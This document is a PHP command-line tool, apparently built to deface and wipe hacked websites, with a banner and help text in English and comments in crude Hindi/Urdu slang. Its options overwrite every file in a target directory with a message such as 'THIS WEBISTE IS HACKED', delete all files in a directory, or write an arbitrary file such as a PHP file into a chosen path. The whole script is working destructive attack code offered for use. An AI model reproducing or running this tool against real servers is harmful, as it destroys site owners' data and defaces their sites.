<?php
error_reporting(0);
function WriteInto($filename, $string){
	if($handle = fopen($filename, "w+")){
		fwrite($handle, $string);
		fclose($handle);
		return "Done ..";	  		
	}else{
		throw new Exception("Dots \"..\" will be escaped ..\n");
	}
}
function DeleteThem($filename){
	if (isset($filename)) {
		if (unlink($filename)) {
			return "Deleted .. \n";
		}else{
			throw new Exception("This file is not deleted.. try manually ..\n");
		}
	}
}

function TouchMe($path, $filename, $content){
		if (!empty($path) && !empty($filename) && $content) {
			if (chdir($path)) {
			$handle= fopen($filename, "w+");
			fwrite($handle, $content);
			fclose($handle);
			echo "Writing file..\n Done!!!!!\n";		
			}else{
				echo "Directory, Not accessible..";
			}
			
		}
		
}

Banner(	
	"\e[0;36m
		______  ______ _   _ _____  _   __  ___  
		|  _  \ |  ___| | | /  __ \| | / / |__ \ 
		| | | | | |_  | | | | /  \/| |/ /     ) |
		| | | | |  _| | | | | |    |    \    / / 
		| |/ /  | |   | |_| | \__/\| |\  \  |_|  
		|___/   \_|    \___/ \____/\_| \_/  (_)\e[0;37m\n"
	);
$get_options 	= 	array('path::','delete::',"string::","touch:","content::", "dir::","help::");
$path_r 		= 	getopt("",$get_options);
$delete 		= 	getopt("",$get_options);
$delete 		= 	trim($delete["delete"]);
$dir 			= 	trim($path_r["path"]);
$string			=	getopt("",$get_options);
$string			= 	trim($string["string"]);
$help			=	getopt("",$get_options);

//YE KAM KA NEHI BAS YUHI AGAR CHAHO TO HATA DO BC

$path 			= 	getopt("", $get_options);
$path 			= 	trim($path["dir"]);
$touch 			= 	getopt("",$get_options);
$touch 			= 	trim($touch["touch"]);
$content		=	getopt("",$get_options);
$content 		= 	trim($content["content"]);


// CHUTIYA FUNCTION DECLARATION .. 
if (isset($help["help"])) {
	echo "\nUsage: php dfuck.php --path=\"/var/www/html/the_DIR_you_want_to_work_with/\" --string=\"THIS WEBISTE IS HACKED\"\n\n[OPTIONS] -\n\nOVERWRITE A WHOLE DIR- \n--path=\"YOUR_PATH\" : specifying path only when you try overwriting all files in a DIR.\n--string=\"YOUR_CONTENT\" : Used with '--path' to assign content.\n\nDELETE ALL FILES IN A DIR-\n--delete=\"YOUR_PATH_TO_DELETE_ALL\"\n\nWRITE A FILE-\n--dir=\"PATH_TO_WRITE\"\n--touch [E.G: --touch test.php]\n--content=\"YOUR_CONTENT_TO_WRITE\"\n";
}
if (isset($path) && isset($touch) && isset($content) && !empty($path) && !empty($touch) && !empty($content)) {
	TouchMe($path, $touch, $content)."\n";
}

//YE KAM KA NEHI BAS YUHI AGAR CHAHO TO HATA DO BC


if (isset($dir) && !empty($dir)) {
	if (chdir($dir)) {
if (is_dir($dir)) {
$array_dir = scandir($dir);
foreach ($array_dir as $key => $value) {
	$key."\n";
}
for ($i=0; $i <=$key ; $i++) { 
	echo $array_dir[$i]."\n";
	try{
		echo WriteInto($array_dir[$i], $string)."\n";	
	} 
	catch(Exception $e){
		echo $e->getMessage();
	}
}
}else{
	echo "No directory with that name exists... \n";
}

}else{
	echo "Directory not accessible..\n";
}
}

if (isset($delete) && !empty($delete)) {
		
if (chdir($delete)) {

$array_dir = scandir($delete);
foreach ($array_dir as $key => $value) {
	$key."\n";
}
for ($i=0; $i <=$key ; $i++) { 
	echo $array_dir[$i]."\n";
	try{

		if (is_file($array_dir[$i])) {
			echo DeleteThem($array_dir[$i]);
		}
			
	} 
	catch(Exception $d){
		echo $d->getMessage();
	}
}	

}else{
	echo "Not accessible..";
}

}
function Banner($banner){
	echo $banner;
}
?>
